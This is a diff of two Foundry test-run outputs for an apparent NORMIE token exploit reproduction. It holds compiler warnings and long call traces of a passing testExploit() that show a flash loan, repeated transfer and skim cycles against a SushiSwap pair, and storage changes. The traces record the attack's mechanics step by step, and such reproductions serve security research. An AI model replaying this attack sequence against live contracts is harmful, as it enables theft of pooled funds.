@@ -1,96 +1,4 @@
-Compiling 1 files with Solc 0.8.30
-Solc 0.8.30 finished in 347.06ms
-Compiler run successful with warnings:
-Warning (2519): This declaration shadows an existing declaration.
-    --> src/test/interface.sol:1084:5:
-     |
-1084 |     function WETH() external view returns (address);
-     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-Note: The shadowed declaration is here:
-   --> src/test/interface.sol:805:1:
-    |
-805 | interface WETH {
-    | ^ (Relevant source part starts here and spans across multiple lines).
-
-Warning (2519): This declaration shadows an existing declaration.
-    --> src/test/interface.sol:1896:5:
-     |
-1896 |     function WETH() external view returns (address);
-     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-Note: The shadowed declaration is here:
-   --> src/test/interface.sol:805:1:
-    |
-805 | interface WETH {
-    | ^ (Relevant source part starts here and spans across multiple lines).
-
-Warning (2519): This declaration shadows an existing declaration.
-    --> src/test/interface.sol:2198:5:
-     |
-2198 |     function WETH() external view returns (address);
-     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-Note: The shadowed declaration is here:
-   --> src/test/interface.sol:805:1:
-    |
-805 | interface WETH {
-    | ^ (Relevant source part starts here and spans across multiple lines).
-
-Warning (2519): This declaration shadows an existing declaration.
-    --> src/test/interface.sol:2967:5:
-     |
-2967 |     function WETH() external view returns (address);
-     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-Note: The shadowed declaration is here:
-   --> src/test/interface.sol:805:1:
-    |
-805 | interface WETH {
-    | ^ (Relevant source part starts here and spans across multiple lines).
-
-Warning (2519): This declaration shadows an existing declaration.
-    --> src/test/interface.sol:4462:5:
-     |
-4462 |     function WETH() external view returns (address);
-     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-Note: The shadowed declaration is here:
-   --> src/test/interface.sol:805:1:
-    |
-805 | interface WETH {
-    | ^ (Relevant source part starts here and spans across multiple lines).
-
-Warning (2519): This declaration shadows an existing declaration.
-  --> src/test/2024-05/NORMIE_exp.sol:25:5:
-   |
-25 |     address WETH = 0x4200000000000000000000000000000000000006;
-   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-Note: The shadowed declaration is here:
-   --> src/test/interface.sol:805:1:
-    |
-805 | interface WETH {
-    | ^ (Relevant source part starts here and spans across multiple lines).
-
-Warning (9302): Return value of low-level calls not used.
-  --> src/test/2024-05/NORMIE_exp.sol:34:9:
-   |
-34 |         payable(address(0)).call{value: ETH_balance_transfer_to_Zero_Address}("");
-   |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-
-Warning (5667): Unused function parameter. Remove or comment out the variable name to silence this warning.
-  --> src/test/2024-05/NORMIE_exp.sol:83:37:
-   |
-83 |     function uniswapV3FlashCallback(uint256 amount0, uint256 amount1, bytes calldata data) external {
-   |                                     ^^^^^^^^^^^^^^^
-
-Warning (5667): Unused function parameter. Remove or comment out the variable name to silence this warning.
-  --> src/test/2024-05/NORMIE_exp.sol:83:54:
-   |
-83 |     function uniswapV3FlashCallback(uint256 amount0, uint256 amount1, bytes calldata data) external {
-   |                                                      ^^^^^^^^^^^^^^^
-
-Warning (5667): Unused function parameter. Remove or comment out the variable name to silence this warning.
-  --> src/test/2024-05/NORMIE_exp.sol:83:71:
-   |
-83 |     function uniswapV3FlashCallback(uint256 amount0, uint256 amount1, bytes calldata data) external {
-   |                                                                       ^^^^^^^^^^^^^^^^^^^
-
+No files changed, compilation skipped
 
 Ran 1 test for src/test/2024-05/NORMIE_exp.sol:ContractTest
 [PASS] testExploit() (gas: 4818038)
@@ -141,8 +49,8 @@ Traces:
     │   ├─ [7801] WETH::transfer(SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], 2000000000000000000 [2e18])
     │   │   ├─ emit Transfer(from: SushiRouterv2: [0x6BDED42c6DA8FBf0d2bA55B2fa120C5e0c8D7891], to: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], value: 2000000000000000000 [2e18])
     │   │   ├─  storage changes:
-    │   │   │   @ 0xb7f00540c39cd87ef3e4b07d856896278fdba0ce5372ab66c55f72b6297e8a10: 0x0000000000000000000000000000000000000000000000001bc16d674ec80000 → 0
     │   │   │   @ 0xfdf5227b1487be35dc63aab006c1a41e45e86b4b570aba92f1d1bb5aed6ed234: 0x000000000000000000000000000000000000000000000009615de6ad849b063a → 0x0000000000000000000000000000000000000000000000097d1f5414d363063a
+    │   │   │   @ 0xb7f00540c39cd87ef3e4b07d856896278fdba0ce5372ab66c55f72b6297e8a10: 0x0000000000000000000000000000000000000000000000001bc16d674ec80000 → 0
     │   │   └─ ← [Return] true
     │   ├─ [2599] NORMIE::balanceOf(Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
     │   │   └─ ← [Return] 0
@@ -166,9 +74,9 @@ Traces:
     │   │   ├─ emit Sync(reserve0: 175036714090827548218 [1.75e20], reserve1: 14922096247845387 [1.492e16])
     │   │   ├─ emit Swap(sender: SushiRouterv2: [0x6BDED42c6DA8FBf0d2bA55B2fa120C5e0c8D7891], amount0In: 2000000000000000000 [2e18], amount1In: 0, amount0Out: 0, amount1Out: 171955761380127 [1.719e14], to: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
     │   │   ├─  storage changes:
+    │   │   │   @ 9: 0x000000000000000000000000000000000e0772e966dfc183d9e9a3c8ef03a472 → 0x000000000000000000000000000000000e077552cef6cb47ffd2fb08ffd957e2
     │   │   │   @ 8: 0x6652af1300000000000000359ff5d83b2d2a000000000009615de6ad849b063a → 0x6652af7f000000000000003503914628320b0000000000097d1f5414d363063a
     │   │   │   @ 10: 0x000000000000000000000000001ea3eb83d56324c2616835724579164bc42540 → 0x000000000000000000000000001ea3fe682aaaf90cef8e2db249ef9374b97d20
-    │   │   │   @ 9: 0x000000000000000000000000000000000e0772e966dfc183d9e9a3c8ef03a472 → 0x000000000000000000000000000000000e077552cef6cb47ffd2fb08ffd957e2
     │   │   └─ ← [Stop]
     │   ├─ [599] NORMIE::balanceOf(Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
     │   │   └─ ← [Return] 171955761380127 [1.719e14]
@@ -183,8 +91,8 @@ Traces:
     │   │   ├─ emit stepLiquify(: false, : true, : false, : true)
     │   │   ├─ emit Transfer(from: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], to: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 5000000000000000 [5e15])
     │   │   ├─  storage changes:
-    │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0x00000000000000000000000000000000000000000000000000009c649212fb1f → 0x00000000000000000000000000000000000000000000000000125fddc9f37b1f
     │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x000000000000000000000000000000000000000000000000003503914628320b → 0x000000000000000000000000000000000000000000000000002340180e47b20b
+    │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0x00000000000000000000000000000000000000000000000000009c649212fb1f → 0x00000000000000000000000000000000000000000000000000125fddc9f37b1f
     │   │   │   @ 0xdbbde71e1a4080345235257e965b73612794cf3c85775e62f0a4e44906b67515: 0 → 1
     │   │   └─ ← [Return] true
     │   ├─ [25811] Attack Contract::uniswapV2Call(Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0, 5000000000000000 [5e15], 0x01)
@@ -220,8 +128,8 @@ Traces:
     │   │   ├─ emit stepLiquify(: false, : true, : true, : true)
     │   │   ├─ emit Transfer(from: UniswapV3Pool: [0x67ab0E84C7f9e399a67037F94a08e5C664DC1C66], to: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 11333141501283594 [1.133e16])
     │   │   ├─  storage changes:
-    │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0 → 0x0000000000000000000000000000000000000000000000000028436ea15f8d0a
     │   │   │   @ 0xcb846511e429ab5845c524f04e52ff9564e66128a17963d68aa59e1320a143aa: 0x0000000000000000000000000000000000000000000000000028436ea15f8d0a → 0
+    │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0 → 0x0000000000000000000000000000000000000000000000000028436ea15f8d0a
     │   │   └─ ← [Return] true
     │   ├─ [5682948] Attack Contract::uniswapV3FlashCallback(0, 113331415012836 [1.133e14], 0x)
     │   │   ├─ [24660] NORMIE::approve(SushiRouterv2: [0x6BDED42c6DA8FBf0d2bA55B2fa120C5e0c8D7891], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
@@ -236,9 +144,9 @@ Traces:
     │   │   │   │   ├─ emit Transfer(from: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], value: 9066513201026875 [9.066e15])
     │   │   │   │   ├─ emit Approval(owner: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: SushiRouterv2: [0x6BDED42c6DA8FBf0d2bA55B2fa120C5e0c8D7891], value: 115792089237316195423570985008687907853269984665640564039457574941399928613060 [1.157e77])
     │   │   │   │   ├─  storage changes:
-    │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x00000000000000000000000000000000000000000000000000359ff5d83b2d2a → 0x0000000000000000000000000000000000000000000000000055d5e7f2ee0465
     │   │   │   │   │   @ 0x7f373bb626ba22b962c7a901729f42a48987c7e95e770bd8abfb8e8d85de746f: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff → 0xffffffffffffffffffffffffffffffffffffffffffffffffffdfca0de54d28c4
     │   │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0x0000000000000000000000000000000000000000000000000028436ea15f8d0a → 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf
+    │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x00000000000000000000000000000000000000000000000000359ff5d83b2d2a → 0x0000000000000000000000000000000000000000000000000055d5e7f2ee0465
     │   │   │   │   └─ ← [Return] true
     │   │   │   ├─ [517] SushiV2Pair::getReserves() [staticcall]
     │   │   │   │   └─ ← [Return] 175036714090827548218 [1.75e20], 15094052009225514 [1.509e16], 1716694911 [1.716e9]
@@ -248,8 +156,8 @@ Traces:
     │   │   │   │   ├─ [22901] WETH::transfer(SushiRouterv2: [0x6BDED42c6DA8FBf0d2bA55B2fa120C5e0c8D7891], 65561172963794850897 [6.556e19])
     │   │   │   │   │   ├─ emit Transfer(from: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], to: SushiRouterv2: [0x6BDED42c6DA8FBf0d2bA55B2fa120C5e0c8D7891], value: 65561172963794850897 [6.556e19])
     │   │   │   │   │   ├─  storage changes:
-    │   │   │   │   │   │   @ 0xb7f00540c39cd87ef3e4b07d856896278fdba0ce5372ab66c55f72b6297e8a10: 0 → 0x0000000000000000000000000000000000000000000000038dd81373dcef9451
     │   │   │   │   │   │   @ 0xfdf5227b1487be35dc63aab006c1a41e45e86b4b570aba92f1d1bb5aed6ed234: 0x0000000000000000000000000000000000000000000000097d1f5414d363063a → 0x000000000000000000000000000000000000000000000005ef4740a0f67371e9
+    │   │   │   │   │   │   @ 0xb7f00540c39cd87ef3e4b07d856896278fdba0ce5372ab66c55f72b6297e8a10: 0 → 0x0000000000000000000000000000000000000000000000038dd81373dcef9451
     │   │   │   │   │   └─ ← [Return] true
     │   │   │   │   ├─ [457] WETH::balanceOf(SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f]) [staticcall]
     │   │   │   │   │   └─ ← [Return] 109475541127032697321 [1.094e20]
@@ -297,9 +205,9 @@ Traces:
     │   │   │   │   ├─ emit stepLiquify(: false, : true, : false, : true)
     │   │   │   │   ├─ emit Transfer(from: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], to: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2266628300256719 [2.266e15])
     │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x00000000000000000000000000000000000000000000000000004de98f7c4486 → 0x00000000000000000000000000000000000000000000000000085b661628fa55
     │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x000000000000000000000000000000000000000000000000005de364799aba34 → 0x0000000000000000000000000000000000000000000000000055d5e7f2ee0465
     │   │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0 → 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf
-    │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x00000000000000000000000000000000000000000000000000004de98f7c4486 → 0x00000000000000000000000000000000000000000000000000085b661628fa55
     │   │   │   │   └─ ← [Return] true
     │   │   │   └─ ← [Stop]
     │   │   ├─ [12931] NORMIE::transfer(SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], 2266628300256719 [2.266e15])
@@ -307,8 +215,8 @@ Traces:
     │   │   │   ├─ emit stepLiquify(: false, : true, : true, : true)
     │   │   │   ├─ emit Transfer(from: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], value: 2266628300256719 [2.266e15])
     │   │   │   ├─  storage changes:
-    │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf → 0
     │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x0000000000000000000000000000000000000000000000000055d5e7f2ee0465 → 0x000000000000000000000000000000000000000000000000005de364799aba34
+    │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf → 0
     │   │   │   └─ ← [Return] true
     │   │   ├─ [45039] SushiV2Pair::skim(Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
     │   │   │   ├─ [457] WETH::balanceOf(SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f]) [staticcall]
@@ -324,8 +232,8 @@ Traces:
     │   │   │   │   ├─ emit Transfer(from: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], to: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2266628300256719 [2.266e15])
     │   │   │   │   ├─  storage changes:
     │   │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0 → 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf
-    │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x00000000000000000000000000000000000000000000000000085b661628fa55 → 0x000000000000000000000000000000000000000000000000001068e29cd5b024
     │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x000000000000000000000000000000000000000000000000005de364799aba34 → 0x0000000000000000000000000000000000000000000000000055d5e7f2ee0465
+    │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x00000000000000000000000000000000000000000000000000085b661628fa55 → 0x000000000000000000000000000000000000000000000000001068e29cd5b024
     │   │   │   │   └─ ← [Return] true
     │   │   │   └─ ← [Stop]
     │   │   ├─ [124478] NORMIE::transfer(SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], 2266628300256719 [2.266e15])
@@ -340,9 +248,9 @@ Traces:
     │   │   │   │   │   ├─ emit Transfer(from: NORMIE: [0x7F12d13B34F5F4f0a9449c16Bcd42f0da47AF200], to: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], value: 4550000000000000 [4.55e15])
     │   │   │   │   │   ├─ emit Approval(owner: NORMIE: [0x7F12d13B34F5F4f0a9449c16Bcd42f0da47AF200], spender: SushiRouterv2: [0x6BDED42c6DA8FBf0d2bA55B2fa120C5e0c8D7891], value: 0)
     │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x0000000000000000000000000000000000000000000000000055d5e7f2ee0465 → 0x0000000000000000000000000000000000000000000000000066001b60a86465
     │   │   │   │   │   │   @ 0x4f8e73b8a1533d3886ca4bbc3edb63bf3610458ad27e93e2b8290bcb666c815b: 0x00000000000000000000000000000000000000000000000000102a336dba6000 → 0
     │   │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x000000000000000000000000000000000000000000000000001068e29cd5b024 → 0x00000000000000000000000000000000000000000000000000003eaf2f1b5024
-    │   │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x0000000000000000000000000000000000000000000000000055d5e7f2ee0465 → 0x0000000000000000000000000000000000000000000000000066001b60a86465
     │   │   │   │   │   └─ ← [Return] true
     │   │   │   │   ├─ [517] SushiV2Pair::getReserves() [staticcall]
     │   │   │   │   │   └─ ← [Return] 109475541127032697321 [1.094e20], 24160565210252389 [2.416e16], 1716694911 [1.716e9]
@@ -385,9 +293,9 @@ Traces:
     │   │   │   │   └─ ← [Stop]
     │   │   │   ├─ emit Transfer(from: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], value: 2266628300256719 [2.266e15])
     │   │   │   ├─  storage changes:
-    │   │   │   │   @ 0x4f8e73b8a1533d3886ca4bbc3edb63bf3610458ad27e93e2b8290bcb666c815b: 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000 → 0x00000000000000000000000000000000000000000000000000102a336dba6000
     │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf → 0
     │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x0000000000000000000000000000000000000000000000000066001b60a86465 → 0x000000000000000000000000000000000000000000000000006e0d97e7551a34
+    │   │   │   │   @ 0x4f8e73b8a1533d3886ca4bbc3edb63bf3610458ad27e93e2b8290bcb666c815b: 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000 → 0x00000000000000000000000000000000000000000000000000102a336dba6000
     │   │   │   └─ ← [Return] true
     │   │   ├─ [45039] SushiV2Pair::skim(Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
     │   │   │   ├─ [457] WETH::balanceOf(SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f]) [staticcall]
@@ -402,9 +310,9 @@ Traces:
     │   │   │   │   ├─ emit stepLiquify(: false, : true, : false, : true)
     │   │   │   │   ├─ emit Transfer(from: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], to: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2266628300256719 [2.266e15])
     │   │   │   │   ├─  storage changes:
-    │   │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0 → 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf
-    │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x00000000000000000000000000000000000000000000000000003eaf2f1b5024 → 0x00000000000000000000000000000000000000000000000000084c2bb5c805f3
     │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x000000000000000000000000000000000000000000000000006e0d97e7551a34 → 0x0000000000000000000000000000000000000000000000000066001b60a86465
+    │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x00000000000000000000000000000000000000000000000000003eaf2f1b5024 → 0x00000000000000000000000000000000000000000000000000084c2bb5c805f3
+    │   │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0 → 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf
     │   │   │   │   └─ ← [Return] true
     │   │   │   └─ ← [Stop]
     │   │   ├─ [12931] NORMIE::transfer(SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], 2266628300256719 [2.266e15])
@@ -412,8 +320,8 @@ Traces:
     │   │   │   ├─ emit stepLiquify(: false, : true, : true, : true)
     │   │   │   ├─ emit Transfer(from: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], value: 2266628300256719 [2.266e15])
     │   │   │   ├─  storage changes:
-    │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf → 0
     │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x0000000000000000000000000000000000000000000000000066001b60a86465 → 0x000000000000000000000000000000000000000000000000006e0d97e7551a34
+    │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf → 0
     │   │   │   └─ ← [Return] true
     │   │   ├─ [45039] SushiV2Pair::skim(Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
     │   │   │   ├─ [457] WETH::balanceOf(SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f]) [staticcall]
@@ -428,9 +336,9 @@ Traces:
     │   │   │   │   ├─ emit stepLiquify(: false, : true, : false, : true)
     │   │   │   │   ├─ emit Transfer(from: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], to: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2266628300256719 [2.266e15])
     │   │   │   │   ├─  storage changes:
-    │   │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0 → 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf
     │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x00000000000000000000000000000000000000000000000000084c2bb5c805f3 → 0x000000000000000000000000000000000000000000000000001059a83c74bbc2
     │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x000000000000000000000000000000000000000000000000006e0d97e7551a34 → 0x0000000000000000000000000000000000000000000000000066001b60a86465
+    │   │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0 → 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf
     │   │   │   │   └─ ← [Return] true
     │   │   │   └─ ← [Stop]
     │   │   ├─ [109078] NORMIE::transfer(SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], 2266628300256719 [2.266e15])
@@ -490,9 +398,9 @@ Traces:
     │   │   │   │   └─ ← [Stop]
     │   │   │   ├─ emit Transfer(from: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], value: 2266628300256719 [2.266e15])
     │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x4f8e73b8a1533d3886ca4bbc3edb63bf3610458ad27e93e2b8290bcb666c815b: 0 → 0x00000000000000000000000000000000000000000000000000102a336dba6000
     │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf → 0
     │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x00000000000000000000000000000000000000000000000000762a4ece62c465 → 0x000000000000000000000000000000000000000000000000007e37cb550f7a34
-    │   │   │   │   @ 0x4f8e73b8a1533d3886ca4bbc3edb63bf3610458ad27e93e2b8290bcb666c815b: 0 → 0x00000000000000000000000000000000000000000000000000102a336dba6000
     │   │   │   └─ ← [Return] true
     │   │   ├─ [45039] SushiV2Pair::skim(Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
     │   │   │   ├─ [457] WETH::balanceOf(SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f]) [staticcall]
@@ -507,9 +415,9 @@ Traces:
     │   │   │   │   ├─ emit stepLiquify(: false, : true, : false, : true)
     │   │   │   │   ├─ emit Transfer(from: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], to: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2266628300256719 [2.266e15])
     │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0 → 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf
     │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x000000000000000000000000000000000000000000000000007e37cb550f7a34 → 0x00000000000000000000000000000000000000000000000000762a4ece62c465
     │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x00000000000000000000000000000000000000000000000000002f74ceba5bc2 → 0x00000000000000000000000000000000000000000000000000083cf155671191
-    │   │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0 → 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf
     │   │   │   │   └─ ← [Return] true
     │   │   │   └─ ← [Stop]
     │   │   ├─ [12931] NORMIE::transfer(SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], 2266628300256719 [2.266e15])
@@ -533,8 +441,8 @@ Traces:
     │   │   │   │   ├─ emit stepLiquify(: false, : true, : false, : true)
     │   │   │   │   ├─ emit Transfer(from: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], to: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2266628300256719 [2.266e15])
     │   │   │   │   ├─  storage changes:
-    │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x00000000000000000000000000000000000000000000000000083cf155671191 → 0x00000000000000000000000000000000000000000000000000104a6ddc13c760
     │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x000000000000000000000000000000000000000000000000007e37cb550f7a34 → 0x00000000000000000000000000000000000000000000000000762a4ece62c465
+    │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x00000000000000000000000000000000000000000000000000083cf155671191 → 0x00000000000000000000000000000000000000000000000000104a6ddc13c760
     │   │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0 → 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf
     │   │   │   │   └─ ← [Return] true
     │   │   │   └─ ← [Stop]
@@ -550,9 +458,9 @@ Traces:
     │   │   │   │   │   ├─ emit Transfer(from: NORMIE: [0x7F12d13B34F5F4f0a9449c16Bcd42f0da47AF200], to: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], value: 4550000000000000 [4.55e15])
     │   │   │   │   │   ├─ emit Approval(owner: NORMIE: [0x7F12d13B34F5F4f0a9449c16Bcd42f0da47AF200], spender: SushiRouterv2: [0x6BDED42c6DA8FBf0d2bA55B2fa120C5e0c8D7891], value: 0)
     │   │   │   │   │   ├─  storage changes:
